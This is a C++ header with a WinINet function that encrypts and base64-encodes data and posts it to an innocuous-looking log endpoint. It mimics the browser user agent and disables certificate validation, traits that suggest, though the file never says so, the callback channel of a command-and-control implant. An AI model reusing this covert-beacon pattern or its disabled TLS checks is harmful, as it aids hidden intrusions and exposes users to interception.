#pragma once

string POST(const string &data, LPCSTR host, int PORT, int HTTPS)
{
	static TCHAR hdrs[] = _T("Content-Type: application/json");
	static LPCSTR accept[2] = { "*/*", NULL };
	DWORD contentLengthLength = sizeof(DWORD);
	DWORD contentLength = 0;
	DWORD length = 0;
	DWORD StatusLength = sizeof(DWORD);
	DWORD Status = 0;
	string post_data = "{\"request\":\"" + base64_encode(encryptDecrypt(data)) + "\"}";

	int secure = 0;
	if (HTTPS == 1)
	{
		secure = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_SECURE;
	}

	char httpUseragent[512];
	DWORD szhttpUserAgent = sizeof(httpUseragent);

	HRESULT user_agent_success = ObtainUserAgentString(0, httpUseragent, &szhttpUserAgent);

	// for clarity, error-checking has been removed
	//HINTERNET hSession = InternetOpen("Mozilla/5.0 (Windows NT 6.4; WOW64)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/36.0.1985.143 Safari/537.36 Edge/12.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hSession = InternetOpen(httpUseragent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnect(hSession, host, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", _T("/api/v2/event/log"), "HTTP/1.1", NULL, accept, secure, 0);
	
	if (HTTPS == 1)
	{
		DWORD dwFlags;
		DWORD dwBuffLen = sizeof(dwFlags);
		InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}
	HttpSendRequest(hRequest, hdrs, strlen(hdrs), (LPVOID)post_data.c_str(), strlen(post_data.c_str()));

	HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &contentLengthLength, NULL);
	HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Status, &StatusLength, NULL);

	const DWORD bufferSize = 2048;
	DWORD bytesRead = 0;
	char buffer[bufferSize];

	string totalbuffer;
	while (TRUE)
	{
		BOOL resone = InternetQueryDataAvailable(hRequest, &length, 0, 0);
		if (!resone || length == 0) break;

		BOOL restwo = InternetReadFile(hRequest, buffer, bufferSize - 1, &bytesRead);
		if (!restwo || (restwo && bytesRead == 0)) break;

		buffer[bytesRead] = 0;
		totalbuffer += buffer;
	};

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	if (Status == 200)
	{
		return totalbuffer;
	}
	else
	{
		return "404";
	}
}